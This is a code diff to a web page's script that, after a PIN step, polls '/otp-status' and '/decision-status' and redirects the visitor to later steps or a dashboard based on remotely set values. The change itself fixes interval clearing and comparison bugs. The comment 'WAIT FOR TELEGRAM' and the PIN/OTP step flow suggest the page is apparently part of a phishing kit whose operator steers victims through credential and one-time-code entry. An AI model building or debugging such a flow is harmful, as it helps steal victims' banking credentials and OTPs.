@@ -41,34 +41,35 @@ if (localStorage.getItem("firstProcess") === "yes") {
 // ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
 if (localStorage.getItem("fromPin") === "yes") {
 
-  setInterval(async () => {
+  const interval = setInterval(async () => {
     try {
         const res = await fetch("/otp-status");
         const data = await res.json();
 
         console.log("OTP STATUS:", data);
 
-        // 🔥 FORCE CHECK (handles string + number)
-        if (data.otp == 5) {
-    localStorage.removeItem("fromPin");
-    clearInterval(this);
-    window.location.href = "step5.html";
-}
+        if (String(data.otp) === "5") {
+            clearInterval(interval);
+            localStorage.removeItem("fromPin");
+            window.location.href = "step5.html";
+        }
 
-        if (data.otp == 6) {
-    localStorage.removeItem("fromPin");
-    clearInterval(this); // stop loop
-    window.location.href = "step6.html";
-}
+        if (String(data.otp) === "6") {
+            clearInterval(interval);
+            localStorage.removeItem("fromPin");
+            window.location.href = "step6.html";
+        }
 
         const decisionRes = await fetch("/decision-status");
         const decisionData = await decisionRes.json();
 
         if (decisionData.decision === "accept") {
+            clearInterval(interval);
             window.location.href = "dashboard.html";
         }
 
         if (decisionData.decision === "decline") {
+            clearInterval(interval);
             localStorage.clear();
             window.location.href = "step5.html";
         }
@@ -76,9 +77,9 @@ if (localStorage.getItem("fromPin") === "yes") {
     } catch (err) {
         console.log("Waiting...");
     }
-}, 2000);  
-
+  }, 2000);
 }
+
 </script>
 
 </body>
